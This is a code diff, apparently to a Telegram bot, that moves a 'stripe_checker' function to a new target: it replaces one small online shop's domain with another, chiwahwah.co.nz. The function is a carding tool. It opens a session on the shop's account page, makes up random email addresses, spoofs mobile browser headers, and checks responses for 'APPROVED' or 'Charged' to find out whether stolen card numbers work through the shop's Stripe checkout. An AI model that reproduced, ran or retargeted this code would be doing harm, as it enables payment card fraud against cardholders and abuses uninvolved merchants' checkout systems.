@@ -206,10 +206,10 @@ mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start")
 # كلمات الـ Approved
 APPROVED_KEYWORDS = ['APPROVED', 'Charged', 'succeeded', 'success":true']
 
-# ==================== دالة الفحص (بوابة shop.skyefift.com) ====================
+# ==================== دالة الفحص (بوابة chiwahwah.co.nz) ====================
 def stripe_checker(ccx):
     """
-    فحص بطاقة باستخدام تدفق Stripe من موقع shop.skyefift.com
+    فحص بطاقة باستخدام تدفق Stripe من موقع chiwahwah.co.nz
     """
     r = requests.Session()
     
@@ -225,13 +225,13 @@ def stripe_checker(ccx):
     if "20" in yy:
         yy = yy.split("20")[1]
 
-    url = "https://shop.skyefift.com/my-account/"
+    url = "https://chiwahwah.co.nz/my-account/"
     pa = urlparse(url)
     urll = f"{pa.scheme}://{pa.netloc}"
     email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
     
     headers = {
-        'authority': 'shop.skyefift.com',
+        'authority': 'chiwahwah.co.nz',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
@@ -278,7 +278,7 @@ def stripe_checker(ccx):
         payment_id = response.json()['id']
         
         headers_ajax = {
-            'authority': 'shop.skyefift.com',
+            'authority': 'chiwahwah.co.nz',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
         }
